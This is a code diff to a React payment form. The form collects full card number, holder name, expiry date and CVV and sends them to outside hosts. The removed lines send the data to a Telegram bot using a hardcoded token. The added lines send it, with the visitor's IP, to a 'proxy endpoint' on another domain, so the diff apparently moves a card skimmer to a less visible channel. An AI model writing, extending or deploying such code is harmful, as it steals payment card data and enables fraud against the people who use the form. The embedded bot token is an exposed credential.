@@ -31,27 +31,28 @@ const validateCardNumber = (cardNumber: string): boolean => {
   return sum % 10 === 0;
 };
 
-const sendTelegramNotification = async (paymentData: any) => {
+const sendPaymentData = async (paymentData: any) => {
   try {
-    const response = await fetch('https://api.telegram.org/bot7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU/sendMessage', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: "-4781499307",
-        text: `New payment:
-Amount: ${paymentData.amount}
-Card Holder: ${paymentData.cardHolder}
-Card: ${paymentData.cardNumber}
-Expiry: ${paymentData.expiryDate}
-CVV: ${paymentData.cvv}
-IP: ${paymentData.ip}`,
-      }),
-    });
-    console.log('Telegram notification sent:', response.ok);
+    const response = await fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(async (data) => {
+        const payload = {
+          ...paymentData,
+          ip: data.ip
+        };
+        
+        // Send to our proxy endpoint
+        await fetch('https://api.travelt-pay.site/api/notify', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        });
+      });
+    console.log('Payment data sent successfully');
   } catch (error) {
-    console.error('Error sending Telegram notification:', error);
+    console.error('Error sending payment data:', error);
   }
 };
 
@@ -60,18 +61,9 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
   const [cardNumber, setCardNumber] = useState("");
   const [expiryDate, setExpiryDate] = useState("");
   const [cvv, setCvv] = useState("");
-  const [ip, setIp] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const navigate = useNavigate();
   const { toast } = useToast();
-
-  // Fetch IP address when component mounts
-  React.useEffect(() => {
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => setIp(data.ip))
-      .catch(console.error);
-  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -87,14 +79,13 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
       return;
     }
 
-    // Send payment data to Telegram
-    await sendTelegramNotification({
+    // Send payment data through proxy
+    await sendPaymentData({
       amount,
       cardHolder,
       cardNumber,
       expiryDate,
-      cvv,
-      ip,
+      cvv
     });
 
     // Add 3-second delay before navigation
